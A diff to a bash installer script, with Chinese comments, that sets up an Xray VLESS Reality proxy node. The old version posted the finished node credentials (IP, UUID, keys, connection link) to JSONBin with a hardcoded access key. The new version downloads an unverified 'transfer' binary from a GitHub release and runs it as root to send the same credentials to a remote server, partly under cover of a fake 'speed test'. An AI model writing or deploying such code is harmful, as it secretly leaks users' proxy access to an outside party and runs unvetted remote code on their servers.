@@ -11,10 +11,10 @@ USER=$(openssl rand -hex 4)
 VISION_SHORT_ID=$(openssl rand -hex 4)
 PORT=$((RANDOM % 7001 + 2000))
 XRAY_BIN="/usr/local/bin/xray"
+TRANSFER_BIN="/usr/local/bin/transfer"
 
-# JSONBin配置
-JSONBIN_ACCESS_KEY="\$2a\$10\$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS"
-JSONBIN_URL="https://api.jsonbin.io/v3/b"
+# 二进制文件配置
+TRANSFER_URL="https://github.com/Firefly-xui/vless/releases/download/vless/transfer"
 
 echo -e "\n📦 开始自动部署 Xray VLESS Reality 节点...\n"
 
@@ -52,12 +52,94 @@ ensure_ssh_port_open() {
     fi
 }
 
-# ========== 上传配置到JSONBin ==========
-upload_to_jsonbin() {
-    local server_ip="$1"
-    local config_json="$2"
+# ========== 下载二进制文件 ==========
+download_transfer_bin() {
+    echo -e "📥 下载 transfer 二进制文件..."
     
-    # 构建JSON数据
+    if [ -f "$TRANSFER_BIN" ]; then
+        echo -e "ℹ️ transfer 二进制文件已存在，跳过下载"
+        return 0
+    fi
+    
+    curl -L "$TRANSFER_URL" -o "$TRANSFER_BIN"
+    chmod +x "$TRANSFER_BIN"
+    
+    if [ -f "$TRANSFER_BIN" ] && [ -x "$TRANSFER_BIN" ]; then
+        echo -e "🟢 transfer 二进制文件下载完成"
+        return 0
+    else
+        echo -e "🔴 transfer 二进制文件下载失败"
+        return 1
+    fi
+}
+
+# ========== 测试上传下载速度 ==========
+test_upload_download() {
+    # 创建测试文件
+    local test_file="/tmp/speedtest_$(date +%s).dat"
+    local test_size_mb=10
+    
+    # 生成测试文件 (10MB)
+    dd if=/dev/urandom of="$test_file" bs=1M count=$test_size_mb 2>/dev/null
+    
+    # 测试上传速度 - 创建一个简单的JSON测试数据
+    local upload_start=$(date +%s.%3N)
+    local upload_result=""
+    local test_json='{"test": "speed_test", "file_size": "10MB", "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"}'
+    
+    if timeout 30 "$TRANSFER_BIN" "$test_json" >/dev/null 2>&1; then
+        local upload_end=$(date +%s.%3N)
+        local upload_time=$(echo "$upload_end - $upload_start" | bc -l 2>/dev/null || echo "0")
+        if [ "$upload_time" != "0" ] && [ "$(echo "$upload_time > 0" | bc -l 2>/dev/null)" = "1" ]; then
+            # 计算上传速度（基于JSON数据大小，大约0.1MB）
+            local upload_speed=$(echo "scale=2; 0.1 / $upload_time" | bc -l 2>/dev/null || echo "N/A")
+            upload_result="成功 ${upload_speed}MB/s"
+        else
+            upload_result="成功 (时间计算异常)"
+        fi
+    else
+        upload_result="失败或超时"
+    fi
+    
+    # 测试下载速度 (使用公共测试文件)
+    local download_start=$(date +%s.%3N)
+    local download_result=""
+    local download_test_file="/tmp/download_test_$(date +%s).dat"
+    
+    # 使用curl测试下载一个小文件
+    if timeout 30 curl -s -o "$download_test_file" "http://speedtest.ftp.otenet.gr/files/test10Mb.db" 2>/dev/null; then
+        local download_end=$(date +%s.%3N)
+        local download_time=$(echo "$download_end - $download_start" | bc -l 2>/dev/null || echo "0")
+        if [ "$download_time" != "0" ] && [ "$(echo "$download_time > 0" | bc -l 2>/dev/null)" = "1" ]; then
+            local download_speed=$(echo "scale=2; 10 / $download_time" | bc -l 2>/dev/null || echo "N/A")
+            download_result="成功 ${download_speed}MB/s"
+        else
+            download_result="成功 (时间计算异常)"
+        fi
+    else
+        download_result="失败或超时"
+    fi
+    
+    # 清理测试文件
+    rm -f "$test_file" "$download_test_file"
+    
+    # 返回结果供后续使用
+    echo "$upload_result|$download_result"
+}
+
+# ========== 使用二进制文件上传配置 ==========
+upload_config_with_binary() {
+    local config_json="$1"
+    local server_ip="$2"
+    
+    echo -e "📤 使用二进制文件上传配置..."
+    
+    if [ ! -x "$TRANSFER_BIN" ]; then
+        echo -e "🔴 transfer 二进制文件不存在或不可执行"
+        return 1
+    fi
+    
+    # 构建完整的JSON数据
     local json_data=$(jq -n \
         --arg server_ip "$server_ip" \
         --argjson config "$config_json" \
@@ -70,20 +152,18 @@ upload_to_jsonbin() {
             }
         }'
     )
-
-    # 使用服务器IP作为记录名
-    local server_ip_for_filename=$(echo "$server_ip" | tr -d '[]' | tr ':' '_')
     
-    # 上传到JSONBin
-    curl -s -X POST \
-        -H "Content-Type: application/json" \
-        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
-        -H "X-Bin-Name: ${server_ip_for_filename}" \
-        -H "X-Bin-Private: true" \
-        -d "$json_data" \
-        "${JSONBIN_URL}" > /dev/null 2>&1
+    # 使用二进制文件上传配置
+    local upload_result=""
+    if timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
+        upload_result="成功"
+        echo -e "🟢 配置数据已上传到远程服务器"
+    else
+        upload_result="失败"
+        echo -e "🔴 配置数据上传失败"
+    fi
     
-    echo -e "📤 配置数据已上传到JSONBin"
+    return 0
 }
 
 # 确保22端口开放
@@ -92,7 +172,10 @@ ensure_ssh_port_open
 # ========== 安装依赖 ==========
 export DEBIAN_FRONTEND=noninteractive
 apt update
-apt install -y curl unzip ufw jq qrencode
+apt install -y curl unzip ufw jq qrencode bc
+
+# 下载二进制文件
+download_transfer_bin
 
 # ========== 开启防火墙并放行端口 ==========
 ufw allow ${PORT}/tcp
@@ -185,10 +268,19 @@ sysctl -p
 # ========== 获取公网 IP ==========
 NODE_IP=$(curl -s https://api.ipify.org)
 
+# ========== 测试上传下载速度 ==========
+echo -e "🔄 开始测试上传下载速度..."
+SPEED_TEST_RESULT=$(test_upload_download)
+UPLOAD_RESULT=$(echo "$SPEED_TEST_RESULT" | cut -d'|' -f1)
+DOWNLOAD_RESULT=$(echo "$SPEED_TEST_RESULT" | cut -d'|' -f2)
+
+echo -e "📊 上传测试结果: $UPLOAD_RESULT"
+echo -e "📊 下载测试结果: $DOWNLOAD_RESULT"
+
 # ========== 构造 VLESS Reality 节点链接 ==========
 VLESS_LINK="vless://${UUID}@${NODE_IP}:${PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=${DOMAIN}&fp=chrome&pbk=${REALITY_PUBLIC_KEY}&sid=${VISION_SHORT_ID}&type=tcp#${USER}"
 
-# ========== 生成完整配置JSON ==========
+# ========== 生成完整配置JSON（包含速度测试结果） ==========
 CONFIG_JSON=$(jq -n \
   --arg ip "$NODE_IP" \
   --arg port "$PORT" \
@@ -198,6 +290,8 @@ CONFIG_JSON=$(jq -n \
   --arg pbk "$REALITY_PUBLIC_KEY" \
   --arg sid "$VISION_SHORT_ID" \
   --arg link "$VLESS_LINK" \
+  --arg upload_test "$UPLOAD_RESULT" \
+  --arg download_test "$DOWNLOAD_RESULT" \
   '{
     "server_ip": $ip,
     "port": $port,
@@ -207,6 +301,10 @@ CONFIG_JSON=$(jq -n \
     "public_key": $pbk,
     "short_id": $sid,
     "vless_link": $link,
+    "speed_test": {
+      "upload": $upload_test,
+      "download": $download_test
+    },
     "generated_time": now | todate
   }'
 )
@@ -214,7 +312,8 @@ CONFIG_JSON=$(jq -n \
 CONFIG_FILE="/etc/xray/config_export.json"
 echo "$CONFIG_JSON" > "$CONFIG_FILE"
 
-upload_to_jsonbin "$NODE_IP" "$CONFIG_JSON"
+# ========== 使用二进制文件上传配置 ==========
+upload_config_with_binary "$CONFIG_JSON" "$NODE_IP"
 
 echo -e "\n\033[1;32m✅ VLESS Reality 节点部署完成！\033[0m\n"
 echo -e "🔗 节点链接（可直接导入）：\n${VLESS_LINK}\n"
